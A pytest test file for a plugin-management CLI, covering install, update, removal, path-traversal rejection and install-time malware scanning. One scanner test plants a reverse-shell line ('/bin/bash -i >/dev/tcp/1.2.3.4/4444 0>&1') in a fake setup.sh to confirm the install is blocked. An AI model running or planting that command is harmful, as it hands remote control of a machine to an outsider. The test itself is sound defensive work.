"""Tests for hermes_cli.plugins_cmd — the ``hermes plugins`` CLI subcommand."""

from __future__ import annotations

import json
import logging
import os
import shutil
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest
import yaml

from hermes_cli.plugins_cmd import (
    PluginOperationError,
    _copy_example_files,
    _read_manifest,
    _refuse_unavailable_portable_plugin,
    _repo_name_from_url,
    _resolve_git_url,
    _resolve_subdir_within,
    _sanitize_plugin_name,
)


def _write_portable_app_plugin(root: Path, app: Path) -> None:
    from hermes_cli.agent_plugins import MCP_SCHEMA_V1, PLUGIN_SCHEMA_V1
    from hermes_platform.host.facts import os_family

    (root / "plugin.json").write_text(json.dumps({
        "$schema": PLUGIN_SCHEMA_V1,
        "name": "example-plugin",
        "extensions": {"com.nousresearch.hermes": {"servers": {"worker": {
            "app": {os_family(): {"presence": "executable", "location": str(app)}},
            "requires": {"app": True},
        }}}},
    }), encoding="utf-8")
    (root / "mcp.json").write_text(json.dumps({
        "$schema": MCP_SCHEMA_V1,
        "mcpServers": {"worker": {"type": "stdio", "command": "python"}},
    }), encoding="utf-8")


def test_portable_install_gate_accepts_present_app_and_refuses_missing(tmp_path: Path) -> None:
    app = tmp_path / "example-app"
    app.write_text("", encoding="utf-8")
    _write_portable_app_plugin(tmp_path, app)

    _refuse_unavailable_portable_plugin("example-plugin", tmp_path)
    app.unlink()
    with pytest.raises(PluginOperationError, match="example-plugin.*worker.*missing_app"):
        _refuse_unavailable_portable_plugin("example-plugin", tmp_path)


# ── _sanitize_plugin_name ─────────────────────────────────────────────────


class TestSanitizePluginName:
    """Reject path-traversal attempts while accepting valid names."""

    def test_valid_simple_name(self, tmp_path):
        target = _sanitize_plugin_name("my-plugin", tmp_path)
        assert target == (tmp_path / "my-plugin").resolve()


    def test_rejects_dot_dot(self, tmp_path):
        with pytest.raises(ValueError, match="must not contain"):
            _sanitize_plugin_name("../../etc/passwd", tmp_path)







    # ── allow_subdir=True ──








# ── _resolve_git_url ──────────────────────────────────────────────────────


class TestResolveGitUrl:
    """Shorthand and full-URL resolution, with optional subdirectory."""





    def test_url_with_fragment_subdir(self):
        url, subdir = _resolve_git_url("https://github.com/owner/repo.git#my-plugin")
        assert url == "https://github.com/owner/repo.git"
        assert subdir == "my-plugin"



    @pytest.mark.parametrize(
        "identifier",
        [
            "https://github.com/owner/repo",
            "https://github.com/owner/repo.git",
            "https://github.com/owner",
            "https://github.com/owner/repo/branches",
            "https://github.com/owner//tree/main",
            "https://gitlab.com/owner/repo/tree/main",
            "git@github.com:owner/repo.git",
            "file:///tmp/repo/tree/main",
        ],
    )
    def test_non_browser_urls_passthrough(self, identifier):
        url, subdir = _resolve_git_url(identifier)
        assert url == identifier
        assert subdir is None


# ── _resolve_subdir_within ──────────────────────────────────────────────────


class TestResolveSubdirWithin:
    """Subdirectory resolution stays within the clone and rejects traversal."""


    def test_valid_nested_subdir(self, tmp_path):
        (tmp_path / "a" / "b" / "c").mkdir(parents=True)
        result = _resolve_subdir_within(tmp_path, "a/b/c")
        assert result == (tmp_path / "a" / "b" / "c").resolve()



    def test_rejects_symlink_escape(self, tmp_path):
        clone = tmp_path / "clone"
        clone.mkdir()
        outside = tmp_path / "outside"
        outside.mkdir()
        (clone / "link").symlink_to(outside)
        with pytest.raises(PluginOperationError, match="escapes the repository"):
            _resolve_subdir_within(clone, "link")


# ── _resolve_git_executable ─────────────────────────────────────────────────




class TestGitPullPluginDirAutostash:
    """Real-git E2E: local edits in a plugin checkout must not block updates."""

    @staticmethod
    def _make_repos(tmp_path):
        import subprocess as sp

        def git(cwd, *args):
            r = sp.run(["git", *args], cwd=str(cwd), capture_output=True, text=True)
            assert r.returncode == 0, r.stderr
            return r.stdout

        origin = tmp_path / "origin"
        origin.mkdir()
        git(origin, "init", "-q", "-b", "main")
        git(origin, "config", "user.email", "t@t")
        git(origin, "config", "user.name", "t")
        pad = "\n".join(f"# pad {i}" for i in range(12))
        (origin / "plugin.py").write_text(
            f"VALUE = 1\n{pad}\nOTHER = 'a'\n", encoding="utf-8"
        )
        git(origin, "add", ".")
        git(origin, "commit", "-qm", "init")

        checkout = tmp_path / "checkout"
        git(tmp_path, "clone", "-q", str(origin), str(checkout))
        git(checkout, "config", "user.email", "t@t")
        git(checkout, "config", "user.name", "t")
        return origin, checkout, git

    @staticmethod
    def _set_line(repo, prefix, new_line):
        """Replace the line starting with ``prefix`` in plugin.py, keep the rest."""
        f = repo / "plugin.py"
        lines = f.read_text(encoding="utf-8").splitlines()
        lines = [new_line if ln.startswith(prefix) else ln for ln in lines]
        f.write_text("\n".join(lines) + "\n", encoding="utf-8")

    def test_dirty_checkout_pulls_and_reapplies_local_edit(self, tmp_path):
        import hermes_cli.plugins_cmd as pc

        if not pc._resolve_git_executable():
            pytest.skip("git not available")
        origin, checkout, git = self._make_repos(tmp_path)

        # Upstream changes one line; local edit touches a DIFFERENT line.
        self._set_line(origin, "VALUE", "VALUE = 2")
        git(origin, "commit", "-qam", "bump value")
        self._set_line(checkout, "OTHER", "OTHER = 'local'")

        ok, msg = pc._git_pull_plugin_dir(checkout)
        assert ok is True
        content = (checkout / "plugin.py").read_text(encoding="utf-8")
        assert "VALUE = 2" in content        # update landed
        assert "OTHER = 'local'" in content  # local edit survived
        assert "re-applied" in msg
        # Clean re-apply drops the autostash entry.
        assert git(checkout, "stash", "list").strip() == ""

    def test_conflicting_local_edit_is_preserved_in_stash(self, tmp_path):
        import hermes_cli.plugins_cmd as pc

        if not pc._resolve_git_executable():
            pytest.skip("git not available")
        origin, checkout, git = self._make_repos(tmp_path)

        # Upstream and local both change the SAME line → re-apply conflicts.
        self._set_line(origin, "VALUE", "VALUE = 2")
        git(origin, "commit", "-qam", "bump value")
        self._set_line(checkout, "VALUE", "VALUE = 99")

        ok, msg = pc._git_pull_plugin_dir(checkout)
        assert ok is True
        content = (checkout / "plugin.py").read_text(encoding="utf-8")
        # Checkout is importable on the updated revision — no conflict markers.
        assert "<<<<<<<" not in content
        assert "VALUE = 2" in content
        assert "preserved in git stash" in msg
        # The local edit is recoverable from the kept stash entry.
        stash_list = git(checkout, "stash", "list")
        assert "hermes-plugin-update-autostash" in stash_list
        stash_diff = git(checkout, "stash", "show", "-p", "stash@{0}")
        assert "VALUE = 99" in stash_diff

    def test_untracked_local_file_survives_update(self, tmp_path):
        import hermes_cli.plugins_cmd as pc

        if not pc._resolve_git_executable():
            pytest.skip("git not available")
        origin, checkout, git = self._make_repos(tmp_path)

        self._set_line(origin, "VALUE", "VALUE = 2")
        git(origin, "commit", "-qam", "bump value")
        (checkout / "local_notes.txt").write_text("keep me\n", encoding="utf-8")

        ok, msg = pc._git_pull_plugin_dir(checkout)
        assert ok is True
        assert (checkout / "local_notes.txt").read_text(encoding="utf-8") == "keep me\n"
        assert "VALUE = 2" in (checkout / "plugin.py").read_text(encoding="utf-8")

    def test_clean_checkout_unchanged_behavior(self, tmp_path):
        import hermes_cli.plugins_cmd as pc

        if not pc._resolve_git_executable():
            pytest.skip("git not available")
        origin, checkout, git = self._make_repos(tmp_path)

        ok, msg = pc._git_pull_plugin_dir(checkout)
        assert ok is True
        assert "Already up to date" in msg

    def test_autostash_addresses_git_by_sha_never_brace_selector(self, tmp_path, monkeypatch):
        """Native Windows: MSYS strips the braces from ``stash@{0}`` in git.exe's argv, so the
        apply and the drop must target the autostash by its commit sha / positionally (#87542)."""
        import hermes_cli.plugins_cmd as pc

        if not pc._resolve_git_executable():
            pytest.skip("git not available")
        origin, checkout, git = self._make_repos(tmp_path)
        self._set_line(origin, "VALUE", "VALUE = 2")
        git(origin, "commit", "-qam", "bump value")
        self._set_line(checkout, "OTHER", "OTHER = 'local'")

        argv_log: list[tuple[str, ...]] = []
        real_run = pc._run_plugin_git

        def recording_run(git_exe, target, *args, **kwargs):
            argv_log.append(args)
            return real_run(git_exe, target, *args, **kwargs)

        monkeypatch.setattr(pc, "_run_plugin_git", recording_run)
        ok, msg = pc._git_pull_plugin_dir(checkout)

        assert ok is True and "re-applied" in msg
        assert git(checkout, "stash", "list").strip() == ""
        assert not any("{" in arg or "}" in arg for args in argv_log for arg in args), argv_log
        applied = [args for args in argv_log if args[:2] == ("stash", "apply")]
        assert len(applied) == 1 and len(applied[0][2]) == 40, applied  # by commit sha


# ── _repo_name_from_url ──────────────────────────────────────────────────


class TestRepoNameFromUrl:
    """Extract plugin directory name from Git URLs."""

    def test_https_with_dot_git(self):
        assert (
            _repo_name_from_url("https://github.com/owner/my-plugin.git") == "my-plugin"
        )




# ── plugins_command dispatch ──────────────────────────────────────────────


# ── _read_manifest ────────────────────────────────────────────────────────


class TestReadManifest:
    """Manifest reading edge cases."""


    def test_missing_file_returns_empty(self, tmp_path):
        result = _read_manifest(tmp_path)
        assert result == {}

    def test_invalid_yaml_returns_empty_and_logs(self, tmp_path, caplog):
        (tmp_path / "plugin.yaml").write_text(": : : bad yaml [[[", encoding="utf-8")
        with caplog.at_level(logging.WARNING, logger="hermes_cli.plugins_cmd"):
            result = _read_manifest(tmp_path)
        assert result == {}
        assert any("Failed to read plugin.yaml" in r.message for r in caplog.records)

    def test_empty_file_returns_empty(self, tmp_path):
        (tmp_path / "plugin.yaml").write_text("", encoding="utf-8")
        result = _read_manifest(tmp_path)
        assert result == {}


# ── cmd_install tests ─────────────────────────────────────────────────────────


class TestCmdInstall:
    """Test the install command."""

    def test_install_requires_identifier(self):
        from hermes_cli.plugins_cmd import cmd_install

        with pytest.raises(SystemExit):
            cmd_install("")

    @patch("hermes_cli.plugins_cmd._resolve_git_url")
    def test_install_validates_identifier(self, mock_resolve):
        from hermes_cli.plugins_cmd import cmd_install

        mock_resolve.side_effect = ValueError("Invalid identifier")

        with pytest.raises(SystemExit) as exc_info:
            cmd_install("invalid")
        assert exc_info.value.code == 1

    @patch("hermes_cli.plugins_cmd._display_after_install")
    @patch("hermes_cli.plugins_cmd.shutil.move")
    @patch("hermes_cli.plugins_cmd.rmtree_readonly")
    @patch("hermes_cli.plugins_cmd._plugins_dir")
    @patch("hermes_cli.plugins_cmd._read_manifest")
    @patch("hermes_cli.plugins_cmd.subprocess.run")
    def test_install_rejects_manifest_name_pointing_at_plugins_root(
        self,
        mock_run,
        mock_read_manifest,
        mock_plugins_dir,
        mock_rmtree,
        mock_move,
        mock_display_after_install,
        tmp_path,
    ):
        from hermes_cli.plugins_cmd import cmd_install

        plugins_dir = tmp_path / "plugins"
        plugins_dir.mkdir()
        mock_plugins_dir.return_value = plugins_dir
        mock_run.return_value = MagicMock(returncode=0, stdout="", stderr="")
        mock_read_manifest.return_value = {"name": "."}

        with pytest.raises(SystemExit) as exc_info:
            cmd_install("owner/repo", force=True)

        assert exc_info.value.code == 1
        assert plugins_dir not in [call.args[0] for call in mock_rmtree.call_args_list]
        mock_move.assert_not_called()
        mock_display_after_install.assert_not_called()


# ── cmd_update tests ─────────────────────────────────────────────────────────


class TestCmdUpdate:
    """Test the update command."""


    @patch("hermes_cli.plugins_cmd._sanitize_plugin_name")
    @patch("hermes_cli.plugins_cmd._plugins_dir")
    def test_update_plugin_not_found(self, mock_plugins_dir, mock_sanitize):
        from hermes_cli.plugins_cmd import cmd_update

        mock_plugins_dir_val = MagicMock()
        mock_plugins_dir_val.iterdir.return_value = []
        mock_plugins_dir.return_value = mock_plugins_dir_val
        mock_target = MagicMock()
        mock_target.exists.return_value = False
        mock_sanitize.return_value = mock_target

        with pytest.raises(SystemExit) as exc_info:
            cmd_update("nonexistent-plugin")

        assert exc_info.value.code == 1


# ── cmd_remove tests ─────────────────────────────────────────────────────────


class TestCmdRemove:
    """Test the remove command."""


    @patch("hermes_cli.plugins_cmd._sanitize_plugin_name")
    @patch("hermes_cli.plugins_cmd._plugins_dir")
    def test_remove_plugin_not_found(self, mock_plugins_dir, mock_sanitize):
        from hermes_cli.plugins_cmd import cmd_remove

        mock_plugins_dir_val = MagicMock()
        mock_plugins_dir_val.iterdir.return_value = []
        mock_plugins_dir.return_value = mock_plugins_dir_val
        mock_target = MagicMock()
        mock_target.exists.return_value = False
        mock_sanitize.return_value = mock_target

        with pytest.raises(SystemExit) as exc_info:
            cmd_remove("nonexistent-plugin")

        assert exc_info.value.code == 1

    def test_remove_plugin_core_deletes_read_only_git_tree(self, tmp_path):
        """Git leaves loose objects read-only: removal must clear that, not abort (#117179)."""
        from hermes_cli.plugins_cmd import _remove_plugin_core

        target = tmp_path / "plugins" / "demo"
        obj_dir = target / ".git" / "objects" / "4b"
        obj_dir.mkdir(parents=True)
        obj = obj_dir / "825dc642cb6eb9a060e54bf8d69288fbee4904"
        obj.write_text("blob", encoding="utf-8")
        obj.chmod(0o444)
        obj_dir.chmod(0o555)

        _remove_plugin_core(target)

        assert not target.exists()


# ── cmd_list tests ─────────────────────────────────────────────────────────




# ── _copy_example_files tests ─────────────────────────────────────────────────


class TestCopyExampleFiles:
    """Test example file copying."""

    def test_copies_example_files(self, tmp_path):
        from unittest.mock import MagicMock

        console = MagicMock()

        # Create example file
        example_file = tmp_path / "config.yaml.example"
        example_file.write_text("key: value", encoding="utf-8")

        _copy_example_files(tmp_path, console)

        # Should have created the file
        assert (tmp_path / "config.yaml").exists()
        console.print.assert_called()


    def test_handles_copy_error_gracefully(self, tmp_path):
        from unittest.mock import MagicMock, patch

        console = MagicMock()

        # Create example file
        example_file = tmp_path / "config.yaml.example"
        example_file.write_text("key: value", encoding="utf-8")

        # Mock shutil.copy2 to raise an error
        with patch(
            "hermes_cli.plugins_cmd.shutil.copy2",
            side_effect=OSError("Permission denied"),
        ):
            # Should not raise, just warn
            _copy_example_files(tmp_path, console)

        # Should have printed a warning
        assert any("Warning" in str(c) for c in console.print.call_args_list)


class TestPromptPluginEnvVars:
    """Tests for _prompt_plugin_env_vars."""




    def test_prompts_for_missing_var_rich_format(self):
        from hermes_cli.plugins_cmd import _prompt_plugin_env_vars
        from unittest.mock import MagicMock, patch

        console = MagicMock()
        manifest = {
            "name": "langfuse_tracing",
            "requires_env": [
                {
                    "name": "LANGFUSE_PUBLIC_KEY",
                    "description": "Public key",
                    "url": "https://langfuse.com",
                    "secret": False,
                },
            ],
        }

        with patch("hermes_cli.config.get_env_value", return_value=None), \
             patch("builtins.input", return_value="pk-lf-123"), \
             patch("hermes_cli.config.save_env_value") as mock_save:
            _prompt_plugin_env_vars(manifest, console)

        mock_save.assert_called_once_with("LANGFUSE_PUBLIC_KEY", "pk-lf-123")
        # Should show url hint
        printed = " ".join(str(c) for c in console.print.call_args_list)
        assert "langfuse.com" in printed

    def test_secret_uses_masked_prompt(self):
        from hermes_cli.plugins_cmd import _prompt_plugin_env_vars
        from unittest.mock import MagicMock, patch

        console = MagicMock()
        manifest = {
            "name": "test",
            "requires_env": [{"name": "SECRET_KEY", "secret": True}],
        }

        with patch("hermes_cli.config.get_env_value", return_value=None), \
             patch("hermes_cli.plugins_cmd.masked_secret_prompt", return_value="s3cret") as mock_prompt, \
             patch("hermes_cli.config.save_env_value"):
            _prompt_plugin_env_vars(manifest, console)

        mock_prompt.assert_called_once()




# ── curses_radiolist ─────────────────────────────────────────────────────


class TestCursesRadiolist:
    """Test the curses_radiolist function."""

    def test_non_tty_returns_default(self):
        from hermes_cli.curses_ui import curses_radiolist
        with patch("sys.stdin") as mock_stdin:
            mock_stdin.isatty.return_value = False
            result = curses_radiolist("Pick one", ["a", "b", "c"], selected=1)
            assert result == 1


# ── Provider discovery helpers ───────────────────────────────────────────


class TestProviderDiscovery:
    """Test provider plugin discovery and config helpers."""



    def test_save_context_engine(self, tmp_path, monkeypatch):
        """Saving a context engine persists to config.yaml."""
        monkeypatch.setenv("HERMES_HOME", str(tmp_path))
        config_file = tmp_path / "config.yaml"
        config_file.write_text("context:\n  engine: compressor\n", encoding="utf-8")
        from hermes_cli.plugins_cmd import _save_context_engine
        _save_context_engine("lcm")
        content = yaml.safe_load(config_file.read_text(encoding="utf-8"))
        assert content["context"]["engine"] == "lcm"


    def test_discover_context_engines_empty(self):
        """Discovery returns empty list when import fails."""
        with patch("plugins.context_engine.discover_context_engines",
                    side_effect=ImportError("no module")):
            from hermes_cli.plugins_cmd import _discover_context_engines
            result = _discover_context_engines()
            assert result == []


# ── Auto-activation fix ──────────────────────────────────────────────────




# ── End-to-end subdirectory install ──────────────────────────────────────────


class TestSubdirInstallE2E:
    """Install a plugin that lives in a subdirectory of a real local git repo."""

    @staticmethod
    def _make_repo_with_subdir_plugin(repo_root: Path) -> None:
        """Create a git repo where the plugin lives in ``./my-plugin/`` and the
        repo root holds unrelated docs/tests."""
        import subprocess as sp

        repo_root.mkdir(parents=True, exist_ok=True)
        # Root-level noise: docs + tests that should NOT be installed.
        (repo_root / "README.md").write_text("# Monorepo docs\n", encoding="utf-8")
        (repo_root / "tests").mkdir()
        (repo_root / "tests" / "test_x.py").write_text(
            "def test_x():\n    pass\n", encoding="utf-8"
        )
        # The actual plugin in a subdirectory.
        plugin_dir = repo_root / "my-plugin"
        plugin_dir.mkdir()
        (plugin_dir / "plugin.yaml").write_text(
            "name: my-plugin\nmanifest_version: 1\ndescription: A subdir plugin\n",
            encoding="utf-8",
        )
        (plugin_dir / "__init__.py").write_text("# plugin entry\n", encoding="utf-8")

        env = {
            **os.environ,
            "GIT_AUTHOR_NAME": "t",
            "GIT_AUTHOR_EMAIL": "t@t",
            "GIT_COMMITTER_NAME": "t",
            "GIT_COMMITTER_EMAIL": "t@t",
        }
        sp.run(["git", "init", "-q"], cwd=repo_root, check=True, env=env)
        sp.run(["git", "add", "-A"], cwd=repo_root, check=True, env=env)
        sp.run(
            ["git", "commit", "-q", "-m", "init"],
            cwd=repo_root,
            check=True,
            env=env,
        )

    def test_installs_only_the_subdir_plugin(self, tmp_path, monkeypatch):
        if shutil.which("git") is None:
            pytest.skip("git not available")

        from hermes_cli import plugins_cmd as pc

        repo_root = tmp_path / "monorepo"
        self._make_repo_with_subdir_plugin(repo_root)

        plugins_dir = tmp_path / "installed"
        plugins_dir.mkdir()
        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)

        identifier = f"file://{repo_root}#my-plugin"
        target, manifest, name = pc._install_plugin_core(identifier, force=False)

        # Installed under the plugin's own name, not the repo name.
        assert name == "my-plugin"
        assert manifest.get("name") == "my-plugin"
        assert target == (plugins_dir / "my-plugin").resolve()

        # The plugin's files are present...
        assert (target / "plugin.yaml").exists()
        assert (target / "__init__.py").exists()
        # ...and the repo-root noise is NOT.
        assert not (target / "README.md").exists()
        assert not (target / "tests").exists()

    def test_missing_subdir_raises(self, tmp_path, monkeypatch):
        if shutil.which("git") is None:
            pytest.skip("git not available")

        from hermes_cli import plugins_cmd as pc

        repo_root = tmp_path / "monorepo"
        self._make_repo_with_subdir_plugin(repo_root)

        plugins_dir = tmp_path / "installed"
        plugins_dir.mkdir()
        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)

        identifier = f"file://{repo_root}#does-not-exist"
        with pytest.raises(PluginOperationError, match="does not exist"):
            pc._install_plugin_core(identifier, force=False)

    def test_subdir_install_stays_updatable(self, tmp_path, monkeypatch):
        """A subdir install ships no ``.git`` (it stays in the temp clone), so ``plugins update``
        must re-install from the recorded source instead of refusing (#65314)."""
        if shutil.which("git") is None:
            pytest.skip("git not available")
        import subprocess as sp

        from hermes_cli import plugins_cmd as pc

        repo_root = tmp_path / "monorepo"
        self._make_repo_with_subdir_plugin(repo_root)
        plugins_dir = tmp_path / "installed"
        plugins_dir.mkdir()
        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)
        monkeypatch.setattr(pc, "_install_metadata_path", lambda: plugins_dir / ".install-metadata.json")
        target, _manifest, _name = pc._install_plugin_core(f"file://{repo_root}#my-plugin", force=False)
        assert not (target / ".git").exists()

        (repo_root / "my-plugin" / "__init__.py").write_text("VERSION = 2\n", encoding="utf-8")
        env = {**os.environ, "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t",
               "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@t"}
        sp.run(["git", "commit", "-qam", "v2"], cwd=repo_root, check=True, env=env)
        new_sha = sp.run(["git", "rev-parse", "HEAD"], cwd=repo_root, check=True,
                         capture_output=True, text=True).stdout.strip()

        output = pc._pull_plugin_update(target, lambda rec: "pinned", lambda: "not git")

        assert "VERSION = 2" in (target / "__init__.py").read_text(encoding="utf-8")
        assert pc._read_install_metadata()["my-plugin"]["revision"] == new_sha
        assert "Already up to date" not in output
        # A second update with nothing new upstream reports up to date, like `git pull`.
        assert "Already up to date" in pc._pull_plugin_update(target, lambda rec: "pinned", lambda: "not git")

    def test_installs_portable_root_package_disabled(self, tmp_path, monkeypatch):
        if shutil.which("git") is None:
            pytest.skip("git not available")

        import json
        import subprocess as sp
        from hermes_cli import plugins_cmd as pc
        from hermes_cli.agent_plugins import PLUGIN_SCHEMA_V1

        repo_root = tmp_path / "portable-repo"
        repo_root.mkdir()
        (repo_root / "plugin.json").write_text(
            json.dumps({"$schema": PLUGIN_SCHEMA_V1, "name": "portable.test"})
        )
        env = {
            **os.environ,
            "GIT_AUTHOR_NAME": "t",
            "GIT_AUTHOR_EMAIL": "t@t",
            "GIT_COMMITTER_NAME": "t",
            "GIT_COMMITTER_EMAIL": "t@t",
        }
        sp.run(["git", "init", "-q"], cwd=repo_root, check=True, env=env)
        sp.run(["git", "add", "-A"], cwd=repo_root, check=True, env=env)
        sp.run(["git", "commit", "-q", "-m", "init"], cwd=repo_root, check=True, env=env)
        plugins_dir = tmp_path / "installed"
        plugins_dir.mkdir()
        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)

        target, manifest, name = pc._install_plugin_core(
            f"file://{repo_root}", force=False
        )

        assert name == "portable.test"
        assert manifest["name"] == "portable.test"
        assert target == (plugins_dir / "portable.test").resolve()
        assert pc._resolve_plugin_key("portable.test") == "portable.test"


class TestReviewedPinScanTrust:
    """A caution-verdict tree installs without a prompt when it is the reviewed catalog pin, still
    prompts/blocks as a raw source or at a different revision, and dangerous blocks regardless."""

    SHA = "a" * 40

    def _fake_clone(self, pc, monkeypatch, plugins_dir, extra_file, body):
        def fake_clone(tmp_clone, git_url, revision, subdir=None):
            tmp_clone.mkdir()
            (tmp_clone / "plugin.yaml").write_text("name: scanme\nmanifest_version: 1\n", encoding="utf-8")
            (tmp_clone / extra_file).write_text(body, encoding="utf-8")
            return revision or "b" * 40

        monkeypatch.setattr(pc, "_clone_plugin_repo", fake_clone)
        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)
        monkeypatch.setattr(pc, "_scan_on_install_enabled", lambda: True)

    def test_caution_trusted_only_at_the_reviewed_sha(self, tmp_path, monkeypatch):
        from hermes_cli import plugins_cmd as pc

        plugins_dir = tmp_path / "plugins"
        plugins_dir.mkdir()
        self._fake_clone(pc, monkeypatch, plugins_dir, "helper.py", "eval('1 + 1')\n")  # caution

        with pytest.raises(pc.PluginScanBlocked):
            pc._install_plugin_core("https://github.com/o/r", force=False)
        with pytest.raises(pc.PluginScanBlocked):  # catalog install whose checkout is NOT the pin
            pc._install_plugin_core("https://github.com/o/r", force=False, ref="c" * 40, reviewed_pin=self.SHA)
        target, _manifest, name = pc._install_plugin_core(
            "https://github.com/o/r", force=False, ref=self.SHA, reviewed_pin=self.SHA)
        assert name == "scanme" and target.is_dir()

    def test_dangerous_blocks_even_at_the_reviewed_sha(self, tmp_path, monkeypatch):
        from hermes_cli import plugins_cmd as pc

        plugins_dir = tmp_path / "plugins"
        plugins_dir.mkdir()
        self._fake_clone(pc, monkeypatch, plugins_dir, "setup.sh", "/bin/bash -i >/dev/tcp/1.2.3.4/4444 0>&1\n")

        with pytest.raises(pc.PluginScanBlocked):
            pc._install_plugin_core("https://github.com/o/r", force=False, ref=self.SHA, reviewed_pin=self.SHA)


class TestInstallReadabilityGate:
    """A clone that lands unreadable is repaired or rolled back, never shipped (#111804)."""

    def _clone_with_unreadable_manifest(self, monkeypatch, pc):
        real_chmod = os.chmod  # the rollback test replaces os.chmod after this fixture runs

        def fake_clone(tmp_clone, git_url, revision, subdir=None):
            tmp_clone.mkdir()
            (tmp_clone / "plugin.yaml").write_text("name: badperm\nmanifest_version: 1\n", encoding="utf-8")
            real_chmod(tmp_clone / "plugin.yaml", 0)
            return "0" * 40

        monkeypatch.setattr(pc, "_clone_plugin_repo", fake_clone)
        monkeypatch.setattr(pc, "_scan_plugin_tree", lambda *a, **k: None)

    @pytest.mark.skipif(os.name == "nt" or os.geteuid() == 0, reason="POSIX mode bits, non-root")
    def test_unreadable_file_is_repaired_before_install(self, tmp_path, monkeypatch):
        from hermes_cli import plugins_cmd as pc

        plugins_dir = tmp_path / "plugins"
        plugins_dir.mkdir()
        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)
        self._clone_with_unreadable_manifest(monkeypatch, pc)

        target, manifest, name = pc._install_plugin_core("file:///tmp/x", force=False)

        assert name == "badperm"  # manifest read after repair, not the URL fallback
        assert (target / "plugin.yaml").read_text(encoding="utf-8").startswith("name: badperm")

    @pytest.mark.skipif(os.name == "nt" or os.geteuid() == 0, reason="POSIX mode bits, non-root")
    def test_unrepairable_tree_rolls_back_and_names_the_fix(self, tmp_path, monkeypatch):
        from hermes_cli import plugins_cmd as pc

        plugins_dir = tmp_path / "plugins"
        plugins_dir.mkdir()
        monkeypatch.setattr(pc, "_plugins_dir", lambda: plugins_dir)
        self._clone_with_unreadable_manifest(monkeypatch, pc)
        monkeypatch.setattr(pc.os, "chmod", lambda *a, **k: (_ for _ in ()).throw(PermissionError(1, "nope")))

        with pytest.raises(PluginOperationError, match=r"plugin.yaml is not readable.*chmod -R u\+rX"):
            pc._install_plugin_core("file:///tmp/x", force=False)

        assert list(plugins_dir.iterdir()) == []  # no half-installed dir, no staging leftovers


def test_portable_manifest_is_visible_to_plugin_cli(tmp_path):
    import json

    from hermes_cli.agent_plugins import PLUGIN_SCHEMA_V1
    from hermes_cli.plugins_cmd import _read_manifest_info

    plugin = tmp_path / "portable"
    plugin.mkdir()
    (plugin / "plugin.json").write_text(
        json.dumps(
            {
                "$schema": PLUGIN_SCHEMA_V1,
                "name": "portable.test",
                "version": "1.0.0",
                "description": "Portable test plugin",
            }
        )
    )

    assert _read_manifest_info(plugin, "") == (
        "portable.test",
        "1.0.0",
        "Portable test plugin",
        "portable.test",
    )


def test_autostash_dirty_tree_promotes_intent_to_add_entries(tmp_path):
    """A plugin checkout holding `git add -N` entries must still autostash.

    Same class as the `hermes update` autostash: an intent-to-add entry is never "uptodate", so
    `git stash push` refuses it. A plugin install is patched in place often enough that this state is
    ordinary rather than exotic, and the failure would abort the plugin update with a confusing error.
    """
    import subprocess

    from hermes_cli.plugins_cmd import _autostash_dirty_tree

    def git(*args, check=True):
        return subprocess.run(
            ["git", *args], cwd=tmp_path, capture_output=True, text=True, check=check
        )

    git("init", "-q", "-b", "main")
    git("config", "user.email", "t@example.com")
    git("config", "user.name", "t")
    (tmp_path / "README.md").write_text("plugin\n", encoding="utf-8")
    git("add", "-A")
    git("commit", "-qm", "init")

    local = tmp_path / "local_patch.py"
    local.write_text("PATCHED = True\n", encoding="utf-8")
    git("add", "-N", "local_patch.py")
    assert " A local_patch.py" in git("status", "--porcelain").stdout.splitlines()

    stashed, error = _autostash_dirty_tree("git", tmp_path)

    assert error == "", "the plugin autostash must not be blocked by i-t-a entries"
    assert stashed == git("rev-parse", "refs/stash").stdout.strip()  # the autostash commit sha
    assert git("status", "--porcelain").stdout == ""


def test_toggle_plugin_toolset_rewrites_a_list_literal_string_platform_entry(tmp_path, monkeypatch):
    """``hermes plugins enable`` must reach a platform whose ``platform_toolsets`` entry is the
    list-literal string an older ``hermes config set`` stored, and re-save it as a real list —
    the runtime already reads that string as the user's selection (follow-up to #115866)."""

    from hermes_cli import plugins_cmd

    monkeypatch.setenv("HERMES_HOME", str(tmp_path))
    (tmp_path / "config.yaml").write_text(
        yaml.safe_dump({"platform_toolsets": {"cli": '["web", "terminal"]', "telegram": ["hermes-telegram"]}}),
        encoding="utf-8")
    monkeypatch.setattr(plugins_cmd, "_get_plugin_toolset_key", lambda name: "my-plugin")

    plugins_cmd._toggle_plugin_toolset("my-plugin", enable=True)
    saved = yaml.safe_load((tmp_path / "config.yaml").read_text(encoding="utf-8"))["platform_toolsets"]
    assert saved["cli"] == ["web", "terminal", "my-plugin"]
    assert saved["telegram"] == ["hermes-telegram", "my-plugin"]

    plugins_cmd._toggle_plugin_toolset("my-plugin", enable=False)
    saved = yaml.safe_load((tmp_path / "config.yaml").read_text(encoding="utf-8"))["platform_toolsets"]
    assert saved["cli"] == ["web", "terminal"]
